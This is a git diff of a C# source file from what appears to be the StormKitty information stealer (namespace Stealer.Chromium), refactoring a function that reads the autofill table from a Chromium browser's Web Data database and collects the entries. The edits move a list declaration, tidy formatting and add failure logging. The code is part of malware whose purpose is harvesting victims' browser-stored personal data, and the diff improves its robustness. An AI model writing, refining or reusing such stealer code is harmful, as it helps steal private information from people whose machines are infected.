@@ -1,5 +1,4 @@
-﻿using System.IO;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 
 namespace Stealer.Chromium
 {
@@ -12,14 +11,12 @@ namespace Stealer.Chromium
         /// <returns>List with autofill</returns>
         public static List<AutoFill> Get(string sWebData)
         {
+            List<AutoFill> acAutoFillData = new List<AutoFill>();
             try
             {
-                List<AutoFill> acAutoFillData = new List<AutoFill>();
-
                 // Read data from table
                 SQLite sSQLite = SqlReader.ReadTable(sWebData, "autofill");
-                if (sSQLite == null)
-                    return acAutoFillData;
+                if (sSQLite == null) return acAutoFillData;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
@@ -31,12 +28,10 @@ namespace Stealer.Chromium
 
                     Counter.AutoFill++;
                     acAutoFillData.Add(aFill);
-
                 }
-
-                return acAutoFillData;
             }
-            catch { return new List<AutoFill>(); }
+            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect autofill data\n" + ex); }
+            return acAutoFillData;
         }
     }
 }
